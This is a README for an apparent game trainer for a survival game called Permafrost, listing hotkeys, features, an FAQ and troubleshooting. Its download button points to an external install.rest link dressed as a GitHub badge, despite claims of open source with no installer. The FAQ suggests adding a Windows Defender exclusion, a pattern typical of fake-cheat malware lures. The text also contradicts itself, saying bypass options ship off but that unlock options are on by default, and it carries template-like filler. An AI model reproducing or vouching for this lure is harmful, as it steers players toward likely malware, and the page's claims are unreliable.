<div align="center">

# Permafrost — Trainer

**Unlock all weapons, infinite resources, instant crafting, and more**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-8c5ac9?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-10%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="https://example.com/permafrost-screenshot.jpg" />
</a>
</p>

</div>

---

> [!NOTE]
> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.

## What it does

Permafrost is a challenging survival game where you must gather resources, craft tools, and build shelters to survive the harsh Arctic environment. The game features a day-night cycle, dynamic weather, and a variety of creatures to encounter. The main challenge is the harsh climate, which can be deadly if you are not prepared.

The most obvious brute-force option is to simply gather resources and craft items without any assistance. While this can work, it is time-consuming and can be frustrating, especially when you are low on resources. Using a trainer can help you skip the tedious parts of the game, allowing you to focus on the more engaging aspects.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| Unlock all weapons | `F1` | Unlocks all weapons in the game |
| Infinite resources | `F2` | Gives you unlimited resources |
| Instant crafting | `F3` | Allows you to craft items instantly |
| Speed multiplier | slider | `1x`–`50x`, default `3x` |
| Time scale | slider | `0%`–`100%` — the softer alternative to speed multiplier |
| Unlock all buildings | `F4` | Unlocks all buildings in the game |
| Bypass crafting requirements | `F5` | Allows you to craft items without the required resources |
| Save game | — | Saves your game state |
| Unlock all achievements | — | Unlocks all achievements in the game |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`bypass`**: removes the work the game is built around · **`spoiler`**: reveals story early · **`save`**: writes persistent data · **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> For a comfortable playthrough, set the speed multiplier to `10x`, the time scale to `50%`, and enable instant crafting. This will remove the frustration of waiting for resources to gather and crafting times, while still maintaining the challenge of the game.

> [!WARNING]
> The bypass crafting requirements option will ruin the game fastest and cost you the satisfaction of earning resources and crafting items yourself.
>
> Options tagged `save` write persistent data that a patch can invalidate. Back up first and disable cloud sync while you experiment.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Single-player only, no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>How do I unlock all weapons?</summary>
Press `F1` to unlock all weapons in the game. This will give you access to all weapons, regardless of your progress in the game.
</details>

<details>
<summary>How do I get infinite resources?</summary>
Press `F2` to enable infinite resources. This will give you unlimited resources, allowing you to craft items without worrying about running out.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| Some options do nothing | That memory allocates only in a battle or a run. Get there first, then toggle. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |
| Game-specific issue | If it is a known game bug rather than yours, say so and point at the developer's notes. |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 2023-06-01 — first release. 10+ options across tabs. Unlock all weapons and infinite resources enabled by default for convenience.

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with Permafrost, developer, or publisher. Permafrost and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
